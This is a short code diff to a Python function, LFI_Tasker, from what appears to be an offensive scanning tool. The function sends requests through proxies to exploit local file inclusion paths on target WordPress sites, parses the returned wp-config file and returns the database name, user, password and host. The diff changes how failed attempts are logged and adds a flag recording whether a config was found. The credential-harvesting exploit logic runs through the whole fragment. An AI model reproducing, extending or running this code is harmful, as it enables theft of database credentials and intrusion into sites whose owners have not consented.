@@ -5,8 +5,9 @@ Module_Helper = importlib.import_module('Core.Core_Helper')
 
 def LFI_Tasker(TARGET, vuln_path, Proxies, User_Agent):
     try:
+        config_found = False
         #print(f'[DEBUG] {TARGET} ==> {vuln_path}') 
-        Module_Helper.Printed_Value.Log_Fail(TARGET, f'[LFI] {vuln_path}') 
+        
 
         Resp_WPConfig = Module_Helper.Threaded_GET(
                                                 TARGET, 
@@ -36,11 +37,13 @@ def LFI_Tasker(TARGET, vuln_path, Proxies, User_Agent):
                 #print("[+] FOUND CONFIG:", vuln_path)
                 DB_NAME, DB_USER, DB_PASSWD, DB_HOST = Module_Helper.WordpressDB_Extract(RESP_DATA['resp'].text)
                 if len(DB_NAME) and len(DB_PASSWD):
+                    config_found = True
                     return DB_NAME, DB_USER, DB_PASSWD, DB_HOST, vuln_path
-        
+
             
 
-        return None
+        if not config_found:
+            Module_Helper.Printed_Value.Log_Fail(TARGET, f'[LFI] {vuln_path}') 
     except:
         return None
         #print('LFI_Tasker', str(e))
